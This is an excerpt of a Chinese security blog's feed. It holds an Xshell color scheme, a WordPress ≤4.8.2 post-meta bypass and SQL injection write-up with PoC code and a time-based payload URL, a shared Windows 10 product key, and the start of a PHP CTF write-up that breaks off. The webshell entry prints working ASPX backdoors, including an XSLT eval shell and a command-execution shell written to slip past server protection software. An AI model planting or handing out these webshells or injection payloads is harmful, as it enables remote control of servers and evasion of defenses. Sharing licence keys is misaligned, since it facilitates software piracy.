    <content type="html"><![CDATA[<p>xshell5默认的配色方案不是很好看，有点伤眼睛，网上也有很多xshell的配色方案，但都感觉不是很满意。<br>最近找到一个monokai的配色方案，配合vim的molokai主题，简直不要太爽!</p><h1 id="新建文件monokai-xcs"><a href="#新建文件monokai-xcs" class="headerlink" title="新建文件monokai.xcs"></a>新建文件monokai.xcs</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">[monokai]</div><div class="line">text=ffffff</div><div class="line">cyan(bold)=a6e22e</div><div class="line">text(bold)=ffffff</div><div class="line">magenta=f92672</div><div class="line">green=80ff80</div><div class="line">green(bold)=80ff80</div><div class="line">background=272822</div><div class="line">cyan=a6e22e</div><div class="line">red(bold)=de8e30</div><div class="line">yellow=66d9ef</div><div class="line">magenta(bold)=f92672</div><div class="line">yellow(bold)=66d9ef</div><div class="line">red=de8e30</div><div class="line">white=c0c0c0</div><div class="line">blue(bold)=ae81ff</div><div class="line">white(bold)=ffffff</div><div class="line">black=000000</div><div class="line">blue=ae81ff</div><div class="line">black(bold)=000000</div><div class="line">[Names]</div><div class="line">name0=monokai</div><div class="line">count=1</div></pre></td></tr></table></figure><h1 id="导入monokai-xcs"><a href="#导入monokai-xcs" class="headerlink" title="导入monokai.xcs"></a>导入monokai.xcs</h1><p>Xshell5 -&gt; 工具 -&gt; 配色方案 -&gt; 导入monokai.xcs<br>上图<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flprkuli4uj311g0i2ab8.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;xshell5默认的配色方案不是很好看，有点伤眼睛，网上也有很多xshell的配色方案，但都感觉不是很满意。&lt;br&gt;最近找到一个monokai的配色方案，配合vim的molokai主题，简直不要太爽!&lt;/p&gt;
&lt;h1 id=&quot;新建文件monokai-xcs&quot;&gt;&lt;a href
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WordPress（4.8.2及以下版本） SQL注入利用漏洞</title>
    <link href="http://www.chabug.org/2017/11/21/WordPress4-82-sql/"/>
    <id>http://www.chabug.org/2017/11/21/WordPress4-82-sql/</id>
    <published>2017-11-21T07:45:36.000Z</published>
    <updated>2017-11-21T07:56:18.954Z</updated>
    
    <content type="html"><![CDATA[<p>WordPress中的<code>POST META</code>为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。</p><p>（该操作的位置在添加/编辑文章，在文本编辑框下方的自定义栏目，如果没有找到自定义栏目，需要在右上角的显示选项内将自定义栏目勾选。）</p><p>自定义栏目/字段的数据以<code>meta_key</code>（字段/栏目名）-&gt;<code>meta_value</code>（值）的形式存放在wp_postmeta表内。以下划线开头的<code>meta_key</code>（字段/栏目名）被认为是保留字段，不允许用户添加。</p><p>本文将介绍如何绕过Wordpress的<code>meta_key</code>检查，添加字段/栏目名以下划线开头的自定义栏目/字段。</p><h1 id="第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞"><a href="#第一章-WordPress-≤-4-7-4-XML-RPC-API-POST-META-未校验漏洞" class="headerlink" title="第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞"></a>第一章 WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞</h1><p>参考内容：<a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">WordPress 4.7.5 Security and Maintenance Release</a></p><h4 id="1-1-POC"><a href="#1-1-POC" class="headerlink" title="1.1 POC"></a>1.1 POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$usr = ‘author’;$pwd = ‘author’;$xmlrpc = ‘http://local.target/xmlrpc.php‘;$client = new IXR_Client($xmlrpc);$content = array(“ID” =&gt; 6, ‘meta_input’ =&gt; array(“_thumbnail_id”=&gt;”xxx”));$res = $client-&gt;query(‘wp.editPost’,0, $usr, $pwd, 6/post_id/, $content);</div></pre></td></tr></table></figure><p>POC来自 <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">WordPress SQLi — PoC by slavco</a></p><h4 id="1-2-漏洞分析"><a href="#1-2-漏洞分析" class="headerlink" title="1.2 漏洞分析"></a>1.2 漏洞分析</h4><p>补丁位置：<a href="https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4#diff-6a81e4b18bb9bfe1f02588ddc35d801b" target="_blank" rel="external"><code>wp-includes/class-wp-xmlrpc-server.php</code></a></p><p>根据补丁的内容，是将传入的$content_struct内容进行了白名单限制，同时也过滤了POC中的<code>meta_input</code>。</p><p>1.先看修复后的_insert_post函数中我们关注代码（文件：<a href="https://github.com/WordPress/WordPress/blob/e88a48a066ab2200ce3091b131d43e2fab2460a4/wp-includes/class-wp-xmlrpc-server.php#L1297" target="_blank" rel="external">wp-includes/class-wp-xmlrpc-server.php</a>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">protected function _insert_post( $user, $content_struct ) &#123;</div><div class="line">    $defaults = array(</div><div class="line">        ...//ignore</div><div class="line">        &apos;custom_fields&apos;  =&gt; null,</div><div class="line">        &apos;terms_names&apos;    =&gt; null,</div><div class="line">        &apos;terms&apos;          =&gt; null,</div><div class="line">        &apos;sticky&apos;         =&gt; null,</div><div class="line">        &apos;enclosure&apos;      =&gt; null,</div><div class="line">        &apos;ID&apos;             =&gt; null,</div><div class="line">    );</div><div class="line">    $post_data = wp_parse_args( array_intersect_key( $content_struct, $defaults ), $defaults );</div><div class="line">    ...//ignore</div><div class="line">    if ( isset( $post_data[&apos;custom_fields&apos;] ) )</div><div class="line">        $this-&gt;set_custom_fields( $post_ID, $post_data[&apos;custom_fields&apos;] );</div><div class="line">    ...//ignore</div><div class="line">    $post_ID = $update ? wp_update_post( $post_data, true ) : wp_insert_post( $post_data, true );</div><div class="line">    if ( is_wp_error( $post_ID ) )</div><div class="line">        return new IXR_Error( 500, $post_ID-&gt;get_error_message() );</div><div class="line">    if ( ! $post_ID )</div><div class="line">        return new IXR_Error( 401, __( &apos;Sorry, your entry could not be posted.&apos; ) );</div><div class="line">    return strval( $post_ID );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>按正常的业务流程，POST META应当是从<code>custom_fields</code>中获取，之后带入<code>set_custom_fields</code>函数中，而且<code>set_custom_fields</code>函数会对<code>meta_key</code>进行检查，不应当存在问题。</p><p>但是在wp_update_post函数与wp_insert_post函数中，会从<code>$post_data[&#39;meta_input&#39;]</code>中取出数据，不经检查直接添加到<code>自定义栏目/字段</code>中。</p><p>2.函数wp_insert_post中我们关注的代码（文件：<a href="https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L2974" target="_blank" rel="external">wp-includes/post.php</a>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">function wp_insert_post( $postarr, $wp_error = false ) &#123;</div><div class="line">    ...//ignore</div><div class="line">    $postarr = wp_parse_args($postarr, $defaults);</div><div class="line">    unset( $postarr[ &apos;filter&apos; ] );</div><div class="line">    $postarr = sanitize_post($postarr, &apos;db&apos;);</div><div class="line">    ...//ignore</div><div class="line">    if ( ! empty( $postarr[&apos;meta_input&apos;] ) ) &#123;</div><div class="line">        foreach ( $postarr[&apos;meta_input&apos;] as $field =&gt; $value ) &#123;</div><div class="line">            update_post_meta( $post_ID, $field, $value );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    ...//ignore</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞"><a href="#第二章-WordPress-≤-4-8-2-POST-META-校验绕过漏洞" class="headerlink" title="第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞"></a>第二章 WordPress ≤ 4.8.2 POST META 校验绕过漏洞</h1><p>WordPress目前最新版为4.8.3，建议大家更新。</p><h4 id="2-1-一个MySQL的trick"><a href="#2-1-一个MySQL的trick" class="headerlink" title="2.1 一个MySQL的trick"></a>2.1 一个MySQL的trick</h4><p>1). 正常的条件查询语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 | _thumbnail_id  | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p><p>2). 现在我们将<code>_thumbnail_id</code>修改成<code>”\x00_thumbnail_id”</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mysql&gt; update wp_postmeta set meta_key = concat(0x00,&apos;TESTC&apos;) where meta_value = &apos;_thumbnail_id&apos;;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div><div class="line">Rows matched: 0  Changed: 0  Warnings: 0</div></pre></td></tr></table></figure></p><p>3). 再次执行第一步的查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = &apos;_thumbnail_id&apos;;</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">| meta_id | post_id | meta_key       | meta_value |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">|       4 |       4 |  _thumbnail_id | TESTC      |</div><div class="line">+---------+---------+----------------+------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p><p>我们可以发现依然可以查询出修改后的数据。</p><h4 id="2-2-POST-META-校验绕过"><a href="#2-2-POST-META-校验绕过" class="headerlink" title="2.2 POST META 校验绕过"></a>2.2 POST META 校验绕过</h4><p>我们来看下检查<code>meta_key</code>的代码，文件<a href="https://github.com/WordPress/WordPress/blob/bbb8d48086b7d10908f4fda673585ee122f2851d/wp-includes/meta.php#L920" target="_blank" rel="external">./wp-includes/meta.php</a>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function is_protected_meta( $meta_key, $meta_type = null ) &#123;</div><div class="line">    $protected = ( &apos;_&apos; == $meta_key[0] );</div><div class="line"></div><div class="line">    /**</div><div class="line">     * Filters whether a meta key is protected.</div><div class="line">     *</div><div class="line">     * [@since](/since) 3.2.0</div><div class="line">     *</div><div class="line">     * [@param](/param) bool   $protected Whether the key is protected. Default false.</div><div class="line">     * [@param](/param) string $meta_key  Meta key.</div><div class="line">     * [@param](/param) string $meta_type Meta type.</div><div class="line">     */</div><div class="line">    return apply_filters( &apos;is_protected_meta&apos;, $protected, $meta_key, $meta_type );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>is_protected_meta函数只检查了$meta<em>key的第一个字符是否以</em>开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。</p><h4 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h4><p>添加自定义字段，meta_key为<code>’_thumbnail_id’</code>的meta_value为<code>’55 %1$%s or sleep(10)#’</code><br>在添加自定义栏目/字段时抓包，将<code>_thumbnail_id</code>替换为<code>%00_thumbnail_id</code><br>访问<code>/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#</code>，触发SQL注入漏洞<br>参考</p><p>WordPress 4.7.5 Security and Maintenance Release – <a href="https://wordpress.org/news/2017/05/wordpress-4-7-5/" target="_blank" rel="external">https://wordpress.org/news/2017/05/wordpress-4-7-5/</a></p><p>WordPress SQLi — PoC by slavco – <a href="https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e" target="_blank" rel="external">https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e</a></p><p>WordPress post meta data checks bypass – <a href="https://hackerone.com/reports/265484" target="_blank" rel="external">https://hackerone.com/reports/265484</a></p><p>WordPress &lt;= 4.8.2 SQL Injection POC – <a href="http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" target="_blank" rel="external">http://blog.vulspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WordPress中的&lt;code&gt;POST META&lt;/code&gt;为文章的自定义栏目/字段，就如一篇文章中会有标题、作者等字段，但是对于有些主题/插件来说，文章中的自有字段显得不够用，就需要用到自定义栏目/字段。&lt;/p&gt;
&lt;p&gt;（该操作的位置在添加/编辑文章，在文本编辑框下
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>收藏一枚win10专业版密匙</title>
    <link href="http://www.chabug.org/2017/11/18/win10-Professional-key/"/>
    <id>http://www.chabug.org/2017/11/18/win10-Professional-key/</id>
    <published>2017-11-18T12:25:36.000Z</published>
    <updated>2017-11-18T12:27:11.092Z</updated>
    
    <content type="html"><![CDATA[<p>收藏一枚win10专业版密匙<br>适用于win10家庭版升级等</p><p><code>VPVKT-NHPHV-D3QX4-WH3RF-Q9MP6</code><br>随时失效</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;收藏一枚win10专业版密匙&lt;br&gt;适用于win10家庭版升级等&lt;/p&gt;
&lt;p&gt;&lt;code&gt;VPVKT-NHPHV-D3QX4-WH3RF-Q9MP6&lt;/code&gt;&lt;br&gt;随时失效&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Xsl Exec Webshell(aspx)</title>
    <link href="http://www.chabug.org/2017/11/18/Xsl-Exec-Webshell-aspx/"/>
    <id>http://www.chabug.org/2017/11/18/Xsl-Exec-Webshell-aspx/</id>
    <published>2017-11-18T11:47:35.000Z</published>
    <updated>2017-11-18T12:07:47.862Z</updated>
    
    <content type="html"><![CDATA[<p>关于使用xsl的webshell以前已经有人发过了，比如aspx的一个webshell如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; %&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.Xml&quot;%&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.Xml.Xsl&quot;%&gt;</div><div class="line">&lt;%</div><div class="line">string xml=@&quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot;?&gt;&lt;root&gt;test&lt;/root&gt;&quot;;</div><div class="line">string xslt=@&quot;&lt;?xml version=&apos;1.0&apos;?&gt;</div><div class="line">&lt;xsl:stylesheet version=&quot;&quot;1.0&quot;&quot; xmlns:xsl=&quot;&quot;http://www.w3.org/1999/XSL/Transform&quot;&quot; xmlns:msxsl=&quot;&quot;urn:schemas-microsoft-com:xslt&quot;&quot; xmlns:zcg=&quot;&quot;zcgonvh&quot;&quot;&gt;</div><div class="line">    &lt;msxsl:script language=&quot;&quot;JScript&quot;&quot; implements-prefix=&quot;&quot;zcg&quot;&quot;&gt;</div><div class="line">        &lt;msxsl:assembly name=&quot;&quot;mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class="line">        &lt;msxsl:assembly name=&quot;&quot;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class="line">        &lt;msxsl:assembly name=&quot;&quot;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class="line">        &lt;msxsl:assembly name=&quot;&quot;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class="line">        &lt;![CDATA[function xml() &#123;var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;var Server=c.Server;eval(Request.Item[&apos;a&apos;],&apos;unsafe&apos;);Response.End();&#125;]]&gt;</div><div class="line">    &lt;/msxsl:script&gt;</div><div class="line">&lt;xsl:template match=&quot;&quot;/root&quot;&quot;&gt;</div><div class="line">    &lt;xsl:value-of select=&quot;&quot;zcg:xml()&quot;&quot;/&gt;</div><div class="line">&lt;/xsl:template&gt;</div><div class="line">&lt;/xsl:stylesheet&gt;&quot;;</div><div class="line">XmlDocument xmldoc=new XmlDocument();</div><div class="line">xmldoc.LoadXml(xml);</div><div class="line">XmlDocument xsldoc=new XmlDocument();</div><div class="line">xsldoc.LoadXml(xslt);</div><div class="line">XslCompiledTransform xct=new XslCompiledTransform();</div><div class="line">xct.Load(xsldoc,XsltSettings.TrustedXslt,new XmlUrlResolver());</div><div class="line">xct.Transform(xmldoc,null,new MemoryStream());</div><div class="line">%&gt;</div></pre></td></tr></table></figure></p><p>密码为 a，这个webshell是可以用菜刀连接的，测试碰到这种情况：服务器有安全狗等防护软件，提交的各种数据包可能会拦截，而现在想要做的就是执行命令就可以了，为了方便，写了一个命令执行的webshell，可回显，可改密码，具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">&lt;%@page language=&quot;C#&quot;%&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.IO&quot;%&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.Xml&quot;%&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.Xml.Xsl&quot;%&gt;</div><div class="line">&lt;%</div><div class="line">string xml=@&quot;&lt;?xml version=&quot;&quot;1.0&quot;&quot;?&gt;&lt;root&gt;test&lt;/root&gt;&quot;;</div><div class="line">string xslt=@&quot;&lt;?xml version=&apos;1.0&apos;?&gt;</div><div class="line">&lt;xsl:stylesheet version=&quot;&quot;1.0&quot;&quot; xmlns:xsl=&quot;&quot;http://www.w3.org/1999/XSL/Transform&quot;&quot; xmlns:msxsl=&quot;&quot;urn:schemas-microsoft-com:xslt&quot;&quot; xmlns:zcg=&quot;&quot;zcgonvh&quot;&quot;&gt;</div><div class="line">    &lt;msxsl:script language=&quot;&quot;JScript&quot;&quot; implements-prefix=&quot;&quot;zcg&quot;&quot;&gt;</div><div class="line">    &lt;msxsl:assembly name=&quot;&quot;mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class="line">    &lt;msxsl:assembly name=&quot;&quot;System.Data, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&quot;/&gt;</div><div class="line">    &lt;msxsl:assembly name=&quot;&quot;System.Configuration, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class="line">    &lt;msxsl:assembly name=&quot;&quot;System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;/&gt;</div><div class="line">        &lt;![CDATA[function xml()&#123;</div><div class="line">        var c=System.Web.HttpContext.Current;var Request=c.Request;var Response=c.Response;</div><div class="line">        var command = Request.Item[&apos;cmd&apos;];</div><div class="line">        var r = new ActiveXObject(&quot;&quot;WScript.Shell&quot;&quot;).Exec(&quot;&quot;cmd /c &quot;&quot;+command);</div><div class="line">        var OutStream = r.StdOut;</div><div class="line">        var Str = &quot;&quot;&quot;&quot;;</div><div class="line">        while (!OutStream.atEndOfStream) &#123;</div><div class="line">            Str = Str + OutStream.readAll();</div><div class="line">            &#125;</div><div class="line">        Response.Write(&quot;&quot;&lt;pre&gt;&quot;&quot;+Str+&quot;&quot;&lt;/pre&gt;&quot;&quot;);</div><div class="line">        &#125;]]&gt;</div><div class="line">    &lt;/msxsl:script&gt;</div><div class="line">&lt;xsl:template match=&quot;&quot;/root&quot;&quot;&gt;</div><div class="line">    &lt;xsl:value-of select=&quot;&quot;zcg:xml()&quot;&quot;/&gt;</div><div class="line">&lt;/xsl:template&gt;</div><div class="line">&lt;/xsl:stylesheet&gt;&quot;;</div><div class="line">XmlDocument xmldoc=new XmlDocument();</div><div class="line">xmldoc.LoadXml(xml);</div><div class="line">XmlDocument xsldoc=new XmlDocument();</div><div class="line">xsldoc.LoadXml(xslt);</div><div class="line">XsltSettings xslt_settings = new XsltSettings(false, true);</div><div class="line">xslt_settings.EnableScript = true;</div><div class="line">try&#123;</div><div class="line">    XslCompiledTransform xct=new XslCompiledTransform();</div><div class="line">    xct.Load(xsldoc,xslt_settings,new XmlUrlResolver());</div><div class="line">    xct.Transform(xmldoc,null,new MemoryStream());</div><div class="line">&#125;</div><div class="line">catch (Exception e)&#123;</div><div class="line">    Response.Write(&quot;Error&quot;);</div><div class="line">&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure></p><p>密码为cmd，可自己改，测试如下图：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1flmhf8orivj31mu0zwgo1.jpg" alt=""><br>附带一个大马里面的命令执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;VB&quot; Debug=&quot;true&quot; %&gt;</div><div class="line">&lt;%@ import Namespace=&quot;system.IO&quot; %&gt;</div><div class="line">&lt;%@ import Namespace=&quot;System.Diagnostics&quot; %&gt;</div><div class="line"></div><div class="line">&lt;script runat=&quot;server&quot;&gt;      </div><div class="line"></div><div class="line">Sub RunCmd(Src As Object, E As EventArgs)            </div><div class="line">  Dim myProcess As New Process()            </div><div class="line">  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            </div><div class="line">  myProcessStartInfo.UseShellExecute = false            </div><div class="line">  myProcessStartInfo.RedirectStandardOutput = true            </div><div class="line">  myProcess.StartInfo = myProcessStartInfo            </div><div class="line">  myProcessStartInfo.Arguments=xcmd.text            </div><div class="line">  myProcess.Start()            </div><div class="line"></div><div class="line">  Dim myStreamReader As StreamReader = myProcess.StandardOutput            </div><div class="line">  Dim myString As String = myStreamReader.Readtoend()            </div><div class="line">  myProcess.Close()            </div><div class="line">  mystring=replace(mystring,&quot;&lt;&quot;,&quot;&amp;lt;&quot;)            </div><div class="line">  mystring=replace(mystring,&quot;&gt;&quot;,&quot;&amp;gt;&quot;)            </div><div class="line">  result.text= vbcrlf &amp; &quot;&lt;pre&gt;&quot; &amp; mystring &amp; &quot;&lt;/pre&gt;&quot;    </div><div class="line">End Sub</div><div class="line"></div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;    </div><div class="line">&lt;form runat=&quot;server&quot;&gt;        </div><div class="line">&lt;p&gt;&lt;asp:Label id=&quot;L_p&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Program&lt;/asp:Label&gt;        </div><div class="line">&lt;asp:TextBox id=&quot;xpath&quot; runat=&quot;server&quot; Width=&quot;300px&quot;&gt;c:\windows\system32\cmd.exe&lt;/asp:TextBox&gt;        </div><div class="line">&lt;p&gt;&lt;asp:Label id=&quot;L_a&quot; runat=&quot;server&quot; width=&quot;80px&quot;&gt;Arguments&lt;/asp:Label&gt;        </div><div class="line">&lt;asp:TextBox id=&quot;xcmd&quot; runat=&quot;server&quot; Width=&quot;300px&quot; Text=&quot;/c net user&quot;&gt;/c net user&lt;/asp:TextBox&gt;        </div><div class="line">&lt;p&gt;&lt;asp:Button id=&quot;Button&quot; onclick=&quot;runcmd&quot; runat=&quot;server&quot; Width=&quot;100px&quot; Text=&quot;Run&quot;&gt;&lt;/asp:Button&gt;        </div><div class="line">&lt;p&gt;&lt;asp:Label id=&quot;result&quot; runat=&quot;server&quot;&gt;&lt;/asp:Label&gt;       </div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;关于使用xsl的webshell以前已经有人发过了，比如aspx的一个webshell如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一道PHP代码审计CTF的Writeup</title>
    <link href="http://www.chabug.org/2017/11/17/php-code-writeup/"/>
    <id>http://www.chabug.org/2017/11/17/php-code-writeup/</id>
    <published>2017-11-17T15:34:43.000Z</published>
    <updated>2017-11-17T15:58:19.419Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.inksec.cn/" target="_blank" rel="external">@Szrzvdny</a>大佬的题  <a href="http://exp10it.tk/2017/11/17/php-code-writeup/#more" target="_blank" rel="external">@X1r0z</a>大佬的思路.</p><p>首先访问网站</p><p><a href="http://118.89.157.11/code/" target="_blank" rel="external">http://118.89.157.11/code/</a><br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/1.jpg" alt="">  </p><p>访问index.txt  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/2.jpg" alt="">  </p><p>直接复制到notepad++里了, 看着比较方便  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/3.jpg" alt="">  </p><p>看代码<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/4.jpg" alt=""><br>md5解密结果: <code>HaHa</code></p><p>HTTP_BGROTNYSPXPD在http包中也没有, 尝试直接构造<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/5.jpg" alt=""><br>返回 man,your need Crack Md5</p><p>来到下一段if语句<br><img src="http://exp10it.tk/2017/11/17/php-code-writeup/6.jpg" alt=""><br>md5解密结果: <code>!#%ASFASDY#$&amp;ASF</code></p><p>在burp中构造</p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/7.jpg" alt="">  </p><p>Go  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/8.jpg" alt="">  </p><p>hash先不管, 看下一段if  </p><p><img src="http://exp10it.tk/2017/11/17/php-code-writeup/9.jpg" alt="">  